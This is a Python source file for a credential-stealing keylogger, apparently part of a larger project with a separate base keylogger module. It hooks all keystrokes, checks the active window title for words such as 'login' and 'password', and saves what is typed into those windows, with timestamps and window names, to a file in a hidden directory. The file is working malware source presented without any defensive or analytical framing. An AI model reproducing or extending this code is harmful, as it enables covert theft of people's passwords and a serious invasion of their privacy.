from pynput import keyboard
import threading
import subprocess
import os
import time
from datetime import datetime
from config import HIDDEN_DIR, LOG_FILE, CRED_FILE
from keylogger_core import Keylogger

class CredentialMonitor(Keylogger):
    def __init__(self):
        super().__init__()
        self.current_window = "Unknown"
        self.cred_path = os.path.join(HIDDEN_DIR, CRED_FILE)
        self.in_credential_mode = False
        self.last_keystroke_time = time.time()
        self.cred_buffer = []
        self.buffer_lock = threading.Lock()

    def _timestamp(self):
        return datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")

    def get_active_window(self):
        try:
            window_id = subprocess.check_output(["xdotool", "getactivewindow"]).decode().strip()
            window_name = subprocess.check_output(["xdotool", "getwindowname", window_id]).decode().strip()
            return window_name
        except:
            return "Unknown"

    def log_credential(self, text):
        """Write complete credential string to Cred.txt"""
        if text.strip():  # ignore empty or whitespace-only
            with open(self.cred_path, 'a', encoding='utf-8') as f:
                f.write(f"{self._timestamp()} [Window: {self.current_window}] {text}\n")

    def flush_cred_buffer(self):
        """Write buffered characters as a single credential string"""
        with self.buffer_lock:
            if self.cred_buffer:
                word = ''.join(self.cred_buffer).strip()
                if word:
                    self.log_credential(word)
                self.cred_buffer.clear()

    def on_press(self, key):
        # Update window title
        self.current_window = self.get_active_window()

        # Detect if current window is a login page
        login_indicators = ["login", "sign in", "password", "auth", "log in"]
        is_login_window = any(ind in self.current_window.lower() for ind in login_indicators)

        # Handle entry/exit of credential mode
        if is_login_window and not self.in_credential_mode:
            self.in_credential_mode = True
            self.log_credential("--- CREDENTIAL CAPTURE START ---")
            # Also log in main timeline
            self.write_to_log(f"\n[CREDENTIAL INPUT DETECTED - {self.current_window}]\n")

        elif not is_login_window and self.in_credential_mode:
            self.flush_cred_buffer()
            self.in_credential_mode = False
            self.log_credential("--- CREDENTIAL CAPTURE END ---")

        # If in credential mode, capture keystrokes to buffer
        if self.in_credential_mode:
            # Handle printable characters
            if hasattr(key, 'char') and key.char is not None:
                # Printable character
                with self.buffer_lock:
                    self.cred_buffer.append(key.char)
                    self.last_keystroke_time = time.time()
            else:
                # Special keys that act as word separators
                if key == keyboard.Key.space:
                    with self.buffer_lock:
                        self.cred_buffer.append(' ')
                elif key == keyboard.Key.enter:
                    self.flush_cred_buffer()  # complete current credential line
                elif key == keyboard.Key.tab:
                    self.flush_cred_buffer()
                elif key == keyboard.Key.backspace:
                    with self.buffer_lock:
                        if self.cred_buffer:
                            self.cred_buffer.pop()
                # Ignore other special keys (Alt, Ctrl, Shift, etc.)
                # Do not add them to buffer

        # Always call parent to log keystrokes to main .logs.txt (timeline)
        super().on_press(key)

    def start(self):
        os.makedirs(HIDDEN_DIR, exist_ok=True)
        # Start a thread to flush buffer after inactivity (e.g., 1 second)
        def inactivity_flusher():
            while self.running:
                time.sleep(0.5)
                if self.in_credential_mode and (time.time() - self.last_keystroke_time > 1.0):
                    self.flush_cred_buffer()
        flusher = threading.Thread(target=inactivity_flusher, daemon=True)
        flusher.start()
        super().start()

    def stop(self):
        self.running = False
        self.flush_cred_buffer()
        super().stop()